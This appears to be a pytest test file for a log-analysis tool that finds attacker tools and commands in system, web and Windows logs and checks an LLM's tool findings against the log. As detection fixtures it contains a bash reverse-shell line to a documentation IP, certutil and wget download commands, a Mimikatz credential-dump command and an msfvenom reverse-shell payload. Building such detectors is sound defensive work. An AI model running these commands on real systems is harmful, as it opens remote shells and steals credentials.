import gzip
import json

import pytest

from logagent import engine, llm, logview, tools
from logagent.collectors.textlogs import parse_app_log


def _scan(tmp_path, path):
    cfg = engine.load_config(None)
    cfg["data_dir"] = str(tmp_path)
    return engine.run_scan(cfg, [{"name": "x", "type": "files", "path": path}], "all", False, lambda m: None)


@pytest.mark.parametrize("path, expected", [
    ("samples/intrusion-auth.log", {"LinPEAS / WinPEAS / LinEnum", "Reverse shell", "Crypto miner",
                                    "Download and run (curl/wget | sh)"}),
    ("samples/web-access.log", {"sqlmap", "Nikto / Nuclei / WPScan", "Gobuster / ffuf / dirb"}),
    ("samples/windows-security.xml", {"LSASS dump via comsvcs.dll", "certutil download/decode", "PsExec",
                                      "Encoded / download PowerShell", "Shadow copy deletion", "Event log clearing"}),
])
def test_catalog_finds_tools_with_positions(tmp_path, path, expected):
    scan = _scan(tmp_path, path)
    names = {t["name"] for t in scan["tools"]}
    assert expected <= names
    for t in scan["tools"]:
        assert t["uses"] and all(u["loc"] and u["loc"]["file"] == path for u in t["uses"])


def test_no_tools_in_ordinary_logs(tmp_path):
    assert _scan(tmp_path, "samples/pi-syslog.log")["tools"] == []


def test_tool_patterns_become_findings(tmp_path):
    scan = _scan(tmp_path, "samples/windows-security.xml")
    lsass = next(f for f in scan["findings"] if "comsvcs" in f["samples"][0])
    assert any(r.startswith("tool: LSASS dump") for r in lsass["reasons"])


def test_logview_file_context_and_paging(tmp_path):
    scan = _scan(tmp_path, "samples/intrusion-auth.log")
    i = next(i for i, t in enumerate(scan["tools"]) if t["name"] == "Reverse shell")
    v = logview.view(scan, f"t/{i}/0", 2, 2)
    hit = [l for l in v["lines"] if l["hit"]]
    assert len(hit) == 1 and "/dev/tcp/203.0.113.50/4444" in hit[0]["text"] and hit[0]["n"] == 19
    assert [l["n"] for l in v["lines"]] == [17, 18, 19, 20, 21]
    up = logview.view(scan, f"t/{i}/0", 3, 0, at=v["lines"][0]["at"])
    assert [l["n"] for l in up["lines"]] == [14, 15, 16, 17] and not any(l["hit"] for l in up["lines"])
    with pytest.raises(logview.ViewError):
        logview.view(scan, "c/doesnotexist/0")
    with pytest.raises(logview.ViewError):
        logview.view(scan, "../../etc/passwd")


def test_logview_windows_xml_shows_command_line(tmp_path):
    scan = _scan(tmp_path, "samples/windows-security.xml")
    i = next(i for i, t in enumerate(scan["tools"]) if t["name"] == "LSASS dump via comsvcs.dll")
    v = logview.view(scan, f"t/{i}/0", 1, 1)
    hit = next(l for l in v["lines"] if l["hit"])
    assert "comsvcs.dll, MiniDump" in hit["text"] and v["kind"] == "windows" and len(v["lines"]) == 3


def test_logview_gzip(tmp_path):
    p = tmp_path / "old.log.gz"
    with gzip.open(p, "wt") as fh:
        fh.write("".join(f"Nov  5 02:{i:02d}:00 web01 sudo[1]:   deploy : TTY=pts/0 ; COMMAND=/usr/bin/id {i}\n" for i in range(30)))
        fh.write("Nov  5 02:31:00 web01 sudo[1]:   deploy : TTY=pts/0 ; COMMAND=/bin/bash -c bash -i >& /dev/tcp/203.0.113.9/9001 0>&1\n")
    scan = _scan(tmp_path, str(p))
    v = logview.view(scan, "t/0/0", 2, 0)
    assert [l["n"] for l in v["lines"]] == [29, 30, 31] and v["lines"][-1]["hit"]


def test_web_access_log_times(tmp_path):
    e = next(parse_app_log(['1.2.3.4 - - [05/Nov/2026:01:50:03 +0000] "GET / HTTP/1.1" 503 0 "-" "curl/8"'], "web"))
    assert e.ts.isoformat() == "2026-11-05T01:50:03+00:00" and e.severity == 3 and e.fields["status"] == "503"
    denied = next(parse_app_log(['1.2.3.4 - - [05/Nov/2026:01:50:04 +0000] "GET /admin HTTP/1.1" 403 0 "-" "curl/8"'], "web"))
    assert denied.severity == 5


def test_cited_ids():
    assert llm.cited_ids("a [E1] b [E2, E3] c [E4][E5] d [E6; E7] [X1]") == ["E1", "E2", "E3", "E4", "E5", "E6", "E7"]


def test_model_pass_keeps_only_tools_present_in_the_log(tmp_path, monkeypatch):
    from logagent.analysis import cluster_events
    from logagent.collectors.sources import collect, parse_window
    from logagent.signals import load_rules
    col = tools.Collector()
    evs = list(collect({"type": "files", "path": "samples/intrusion-auth.log"}, parse_window("all"), warn=print))
    cluster_events(evs, load_rules(), lambda e, k: col.add(e, k))
    reply = {"tools": [
        {"name": "Mimikatz", "evidence": "mimikatz.exe sekurlsa::logonpasswords", "category": "attacker"},   # not in log
        {"name": "xmrig", "evidence": "/tmp/.cache/xmrig", "category": "miner"},                             # catalog dup
        {"name": "useradd", "evidence": "useradd", "category": "admin", "what": "adds users"},              # real
    ]}
    monkeypatch.setattr(llm, "chat", lambda *a, **k: (json.dumps(reply), {}))
    extra, err = tools.model_pass(col, {"provider": "openai"})
    assert err is None and [t["name"] for t in extra] == ["useradd"]
    assert extra[0]["uses"][0]["loc"]["line"] == 15
    assert "xmrig" in col.tools["Crypto miner"].get("also", [])


def test_tools_named_in_script_comments_are_not_uses():
    from datetime import datetime, timezone
    from logagent.model import Event
    col = tools.Collector()
    credit = "<# .SYNOPSIS Idea stolen from the local_admin_search_enum post module in Metasploit #>\nfunction Get-Thing { 1 }"
    col.add(Event(ts=datetime.now(timezone.utc), host="h", source="windows:PowerShell", severity=4, message="script",
                  program="PowerShell", event_id="4104", fields={"ScriptBlockText": credit}), "k1")
    assert "Metasploit / Meterpreter" not in col.tools
    col.add(Event(ts=datetime.now(timezone.utc), host="h", source="windows:PowerShell", severity=4, message="script",
                  program="PowerShell", event_id="4104", fields={"ScriptBlockText": "msfvenom -p windows/x64/shell_reverse_tcp"}), "k2")
    assert "Metasploit / Meterpreter" in col.tools


def test_tool_locations_flag_unusual_folders():
    assert tools.paths_in("certutil -urlcache -f http://x/a.exe C:\\Users\\Public\\a.exe /f") == ["C:\\Users\\Public\\a.exe"]
    assert tools.paths_in("USER=root ; PWD=/home/deploy ; COMMAND=/usr/bin/wget http://x -O /tmp/l.sh") == ["/usr/bin/wget", "/tmp/l.sh"]
    assert tools.paths_in('1.2.3.4 - - [05/Nov/2026:01:50:03 +0000] "GET /api/item?id=1 HTTP/1.1" 500 0 "-" "sqlmap/1.8"') == []
    from collections import Counter
    locs = tools.location_summary(Counter({"/usr/bin/wget": 3, "/tmp/l.sh": 1}))
    assert locs[0] == {"path": "/tmp/l.sh", "dir": "/tmp/", "count": 1, "unusual": True}


def test_made_up_citations_are_removed():
    assert llm.drop_unresolved("a [E1] b [E3] c [E1, E9] d.", {"E1": "c/k/0"}) == "a [E1] b c [E1] d."
